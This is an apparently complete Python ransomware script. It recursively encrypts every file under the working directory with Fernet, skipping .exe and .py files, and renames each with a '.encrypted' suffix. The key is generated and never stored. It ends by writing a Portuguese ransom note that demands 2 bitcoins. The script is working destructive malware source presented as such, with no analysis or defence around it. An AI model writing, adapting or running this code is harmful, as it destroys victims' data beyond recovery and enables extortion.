import os, sys
from cryptography.fernet import Fernet

root_dir = os.getcwd()

all_files = []

def list_files(base_dir):
    global all_files
    for entry in os.listdir(base_dir):

        entry_path = os.path.join(base_dir, entry)

        if os.path.isdir(entry_path):
            list_files(entry_path)
        elif os.path.isfile(entry_path):
            if not entry.endswith((".exe", ".py", "Readme.txt")):
                all_files.append(entry_path)

key = Fernet.generate_key()

list_files(root_dir)

# Abrindo os arquivos em wb para escrever como binário

for file in all_files:
    with open(file, "rb") as raw_file:
        contents = raw_file.read()
    enc_contents = Fernet(key).encrypt(contents)
    with open(file, "wb") as raw_file:
        raw_file.write(enc_contents)

    new_file_path = file + ".encrypted"
    os.rename(file, new_file_path)

print("Files that have been encrypted are:")
for names in all_files:
    print("{}".format(names))

readme_content = "Você foi vítima do ransomware b1d0ws. Por favor, transfira 2 bitcoins para esta carteira para que seus arquivos sejam descriptografados: 1se983l4js81ha"
readme_file_path = "Readme.txt"
with open(readme_file_path, "w") as readme_file:
    readme_file.write(readme_content)